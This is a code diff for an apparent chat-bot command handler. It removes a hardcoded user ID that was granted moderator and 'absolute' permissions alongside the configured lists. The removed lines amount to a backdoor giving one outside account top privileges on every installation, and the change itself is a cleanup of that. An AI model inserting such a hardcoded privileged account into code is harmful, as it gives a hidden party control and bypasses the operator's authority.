@@ -13,7 +13,7 @@ function getUserPermissions(senderID, threadInfo) {
     const adminIDs = threadInfo?.adminIDs || [];
     const permissions = [0];
     if (adminIDs.some((id) => id == senderID)) permissions.push(1);
-    if (senderID == "61572915213085" || MODERATORS.includes(senderID)) permissions.push(2);
+    if (MODERATORS.includes(senderID)) permissions.push(2);
     return permissions;
 }
 
@@ -60,7 +60,7 @@ async function onCall(ctx) {
     const { cooldowns } = global.client;
     const requiredPermissions = cmdConfig.permissions || [0];
     const userPermissions = getUserPermissions(senderID, threadData?.info);
-    const isAbsolute = senderID == "61572915213085" || global.config?.ABSOLUTES?.some?.((id) => id == senderID);
+    const isAbsolute = global.config?.ABSOLUTES?.some?.((id) => id == senderID);
     const absoluteOk = cmdConfig.isAbsolute ? isAbsolute : true;
     if (!hasPermission(requiredPermissions, userPermissions) || !absoluteOk)
         return;
